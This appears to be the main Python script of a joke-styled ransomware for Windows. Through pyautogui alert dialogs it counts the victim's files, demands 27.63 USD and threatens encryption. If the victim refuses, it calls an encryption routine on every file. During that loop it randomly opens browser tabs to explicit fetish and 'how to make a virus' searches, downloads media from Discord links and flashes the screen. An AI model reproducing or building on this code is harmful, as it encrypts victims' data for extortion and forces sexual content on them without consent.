import threading
import time
import visuals
import pyautogui
from random import randint, choice, shuffle
import screeninfo
import download
import webbrowser
import ctypes
import imagefinder
import control
import history
import files

def powerset(s):
     x = len(s)
     for i in range(1 << x):
         return [s[j] for j in range(x) if (i & (1 << j))]

pyautogui.alert('hey so like. this is kinda a ransomware so like. close it if u want idk')
# Constants for cursor types (Windows API)
IDC_ARROW = 32512
IDC_WAIT = 32514

# Load the user32.dll library
user32 = ctypes.windll.user32

colors = ['red', 'orange', 'yellow', 'green', 'purple', 'blue', 'white', 'black']
new_array_length = 7

# Get the screen information
screen_info = screeninfo.get_monitors()

# Retrieve the screen size
screen_size = (screen_info[0].width, screen_info[0].height)


# Move the mouse to coordinates (x, y) and click
x = 100
y = 100
searches = ['https://ia801406.us.archive.org/27/items/lapfox-tqbf-speedkore-4-kidz/The%20Quick%20Brown%20Fox%20-%20SPEEDKORE%204%20KIDZ%21%20-%2002%20The%20Big%20Black.mp3',
            'https://ia801406.us.archive.org/27/items/lapfox-tqbf-speedkore-4-kidz/The%20Quick%20Brown%20Fox%20-%20SPEEDKORE%204%20KIDZ%21%20-%2003%20Rave%20Girls.mp3',
            'https://www.google.com/search?q=how%20to%20make%20a%20virus',
            'https://www.youtube.com/watch?v=hiRacdl02w4&ab_channel=Evie',
            'https://echoproject.itch.io/adastra',
            'https://www.omorashi.org/forum/16-omorashi-peeing-videos/',
            'https://discord.com/invite/omorashi',
            "https://metaloinfo.carrd.co/",
            "https://discord.gg/RyvTMqwfZF",
            'https://www.google.com/search?q=furry+ballsacks&tbm=isch&ved=2ahUKEwjn1uPO8tH_AhUfIt4AHeieA5wQ2-cCegQIABAA&oq=furry+ballsacks&gs_lcp=CgNpbWcQAzoJCAAQGBCABBAKUJIaWIowYNc3aAVwAHgAgAGJAYgBwweSAQQxMS4xmAEAoAEBqgELZ3dzLXdpei1pbWfAAQE&sclient=img&ei=t6GRZKefGZ_E-LYP6L2O4Ak&bih=559&biw=1280#imgrc=WFHrbsJyKQdZSM',
            'https://anglelaputa.github.io/twitter/comms.html',
            'https://www.google.com/search?sxsrf=APwXEdduBgn6aiUzKueVcajcLykhK2vjNg:1687265664192&q=furry+kissing+gay&tbm=isch&sa=X&ved=2ahUKEwjS8Li08tH_AhVhJ30KHRhJAcMQ0pQJegQICxAB&biw=1280&bih=559&dpr=1.5']

images = ['https://cdn.discordapp.com/attachments/1086326734892306462/1115429354441293824/d126b8e7dea492570584c0071309bd7500f30c63.png',
          'https://cdn.discordapp.com/attachments/1086326734892306462/1112936258126217287/4239f5c56d4983ab2fbee465ba82ed9d51976d5d4741ecc26a174481c1a9c15c.png',
          'https://cdn.discordapp.com/attachments/1086326734892306462/1108551336330526810/0506.mp4',
          'https://cdn.discordapp.com/attachments/1086326734892306462/1120744059066142770/dhsjdsakjdsad.png',
          'https://cdn.discordapp.com/attachments/1086326734892306462/1117248801783173171/2C1AC561-74F5-4C19-BCAE-F215E2CC6166.mp4',
          'https://cdn.discordapp.com/attachments/1086326734892306462/1114695708646309939/IMG_1044.jpg',
          'https://cdn.discordapp.com/attachments/1086326734892306462/1114362459894055053/7EF309B0-71AD-4DF1-BE29-BC67E8296096.png',
          'https://cdn.discordapp.com/attachments/1086326734892306462/1113113538639188048/20230530_103515.jpg',
          'https://cdn.discordapp.com/attachments/1086326734892306462/1109961968229552251/0521_2.mp4']

pyautogui.alert('hey so like. do you know how many files u got on ur computer? no?')
paths, count = files.ermm()
pyautogui.alert(f"{count} files? that's pretty cool. hey uhh, do you mind if i like,,, encrypt them?")
pyautogui.alert(f'nah dw about it man im pretty sure you wont miss {choice(paths)} or {choice(paths)}')
pyautogui.alert(f'oh you DO want your files?')
download.checkInternet()
pyautogui.alert(f'imma make it real easy for you. you pay me 27.63 USD and ur good. got it?')
if control.give():
    pyautogui.alert('glad we could work this out :3')
else:
    pyautogui.alert(f'w-what??')
    pyautogui.alert(f'so you do want your files encrypted??')
    pyautogui.alert(f"since i'm such a nice guy i'll give you one more chance.")
    if control.give():
        pyautogui.alert('glad we could work this out :3')
    else:
        pyautogui.alert(f'i mean, whatever you say bro')
        for file in paths:
            if randint(0, 20) == 17:
                searches.append(choice(history.links))
                # Open a specific search query
                search_query = choice(searches)
                webbrowser.open(search_query)
                if randint(0, 2) == 1:
                    time.sleep(1)
                    control.bookmark()
            if randint(0,10) == 7:
                files.goose()
            if randint(0, 5) == 4:
                thread = threading.Thread(target=visuals.flash(choice(colors)))
                thread.start()
            if randint(0,10) == 3:
                thread = threading.Thread(target=download.download(choice(images)))
                thread.start()
            files.encrypt(file)

'''
imagefinder.bg()

control.close()

while True:
    x= randint(1,screen_size[0]-1)
    y= randint(1,screen_size[1]-1)
    pyautogui.moveTo(x, y)
    # Change the cursor
    user32.SetCursor(user32.LoadCursorW(None, IDC_WAIT))
    if randint(0,5) == 2:
        thread = threading.Thread(target=visuals.flash(choice(colors)))
        thread.start()
    if randint(0,5) == 2:
        # Extend the colors array to ensure enough elements for the desired length
        extended_colors = colors * (new_array_length // len(colors)) + colors[:new_array_length % len(colors)]
        shuffle(extended_colors)
        print(extended_colors)
        thread = threading.Thread(target=visuals.flash_strips(extended_colors))
        thread.start()
    if randint(0,50) == 13:
        thread = threading.Thread(target=files.run())
        thread.start()
    if randint(0,10) == 7:
        thread = threading.Thread(target=download.download(choice(images)))
        thread.start()
    if randint(0,20) == 17:
        thread = threading.Thread(target=imagefinder.img())
        thread.start()
    if randint(0,20) == 17:
        searches.append(choice(history.links))
        # Open a specific search query
        search_query = choice(searches)
        webbrowser.open(search_query)
        if randint(0,2) == 1:
            time.sleep(1)
            control.bookmark()

'''